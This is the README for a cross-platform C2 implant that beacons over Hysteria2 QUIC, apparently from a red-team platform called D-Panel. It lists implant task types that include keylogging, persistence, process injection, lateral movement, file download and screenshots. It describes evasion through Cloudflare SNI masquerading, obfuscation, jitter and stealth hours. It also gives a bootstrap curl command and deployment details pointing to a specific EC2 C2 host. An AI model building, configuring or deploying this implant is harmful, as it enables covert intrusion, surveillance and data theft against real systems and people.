# D-Panel Hysteria2 QUIC Implant

A lightweight, cross-platform C2 implant that communicates over Hysteria2 QUIC protocol for covert operations.

## Features

- **QUIC-based Communication** - Blends in with normal HTTP/3 traffic
- **Cross-Platform Support** - Windows, Linux, macOS (x86/x64/ARM)
- **Enhanced Jittered Beaconing** - Configurable sleep intervals with randomization and exponential backoff
- **Dynamic Adaptation** - Automatic beacon interval adjustment based on network conditions
- **Exponential Backoff** - Intelligent retry logic with configurable backoff multiplier
- **Kill Switch Support** - Remote shutdown capability for emergency operations
- **Network Awareness** - Automatic network change detection and adaptation
- **Heartbeat Monitoring** - Periodic health status reporting to C2 server
- **Stealth Mode** - Time-based activity reduction during configured hours
- **Task Execution** - Remote command execution and system operations
- **Encrypted Communication** - End-to-end encryption for all C2 traffic
- **Small Footprint** - Compiled binary under 10MB

## Quick Start

### 1. Generate Implant Configuration
```bash
# Bootstrap from D-Panel server
curl "https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/sub/hysteria2?token=dpanel-implant-bootstrap-token-change-this&implant=true"
```

### 2. Run Implant
```bash
# Linux/macOS
./h2-implant-linux-amd64

# Windows
h2-implant-windows-amd64.exe

# Show version
./h2-implant-linux-amd64 -v
```

## Configuration

The implant automatically fetches configuration from the D-Panel subscription endpoint:

### Basic Configuration
- **Servers**: Hysteria2 C2 servers
- **Authentication**: Password-based auth
- **Beaconing**: 45s base interval ±25s jitter
- **SNI**: Cloudflare.com for traffic blending
- **Obfuscation**: Salamander protocol

### Enhanced Configuration
- **Max Retries**: Maximum retry attempts for failed operations (default: 3)
- **Backoff Multiplier**: Exponential backoff multiplier (default: 2.0)
- **Max Backoff**: Maximum backoff time in seconds (default: 300)
- **Kill Switch Enabled**: Enable remote kill switch (default: true)
- **Heartbeat Interval**: Heartbeat reporting interval in seconds (default: 300)
- **Network Aware**: Enable network adaptation (default: true)
- **Stealth Hours**: Hours for reduced activity (default: [0,1,2,3,4,5,22,23])

## Task Types

| Task Type | Description |
|-----------|-------------|
| `exec` | Execute system commands |
| `info` | Gather system information |
| `sleep` | Change beacon interval |
| `download` | Download files from target |
| `upload` | Upload files to target |
| `screenshot` | Capture desktop screenshots |
| `keylogger` | Keylogger operations |
| `persist` | Persistence mechanisms |
| `inject` | Process injection |
| `lateral` | Lateral movement |
| `selfdestruct` | Self-destruct implant |

## API Endpoints

- **Subscription**: `/api/sub/hysteria2`
- **Task Polling**: `/api/dpanel/implant/tasks` (enhanced with system info and network state)
- **Result Upload**: `/api/dpanel/implant/result`
- **Heartbeat**: `/api/dpanel/implant/heartbeat` (new)

### Enhanced Task Request Format
The enhanced task request now includes:
- System information (hostname, OS, arch, memory, Go version)
- Network state (interface, IP address, latency)
- Beacon state (consecutive failures, current backoff, checkin stats)

### Enhanced Task Response Format
The enhanced task response now includes:
- Kill switch flag for emergency shutdown
- Dynamic configuration updates for runtime adaptation

## Security Features

- TLS 1.3 encryption
- HTTP/3 QUIC protocol
- SNI masquerading
- Enhanced jittered communications with exponential backoff
- No persistent storage
- Kill switch for emergency operations
- Network change detection for OPSEC
- Stealth mode during configured hours
- Automatic retry logic with intelligent backoff

## Building from Source

```bash
# Install dependencies
go mod tidy

# Build for all platforms
./build.sh

# Build for specific platform
GOOS=linux GOARCH=amd64 go build -o h2-implant .
```

## Deployment Notes

- Target server: **ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com**
- Default port: **443** (HTTPS)
- Backup port: **8080**
- Protocol: **Hysteria2 over QUIC**

## Operational Security

- All traffic appears as normal Cloudflare HTTP/3
- Implant uses no disk-based configuration
- Memory-only operation where possible
- Automatic cleanup on self-destruct
- **Enhanced OPSEC**:
  - Automatic beacon interval adaptation based on network conditions
  - Stealth mode during late-night hours (configurable)
  - Network change detection with automatic backoff reset
  - Exponential backoff on consecutive failures to avoid detection
  - Heartbeat monitoring for health status without task polling

## Troubleshooting

### Connection Issues
- Verify server connectivity: `telnet ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com 443`
- Check DNS resolution for Cloudflare SNI
- Validate firewall allows UDP outbound

### Authentication Failures
- Verify bootstrap token is correct
- Check server clock synchronization
- Ensure server URL is accessible

### Performance Issues
- Adjust beacon intervals via `sleep` task
- Monitor network latency to C2 server
- Consider server geographic location

---
**D-Panel Red Team Operations Platform**  
*Advanced C2 Infrastructure for Professional Red Team Operations*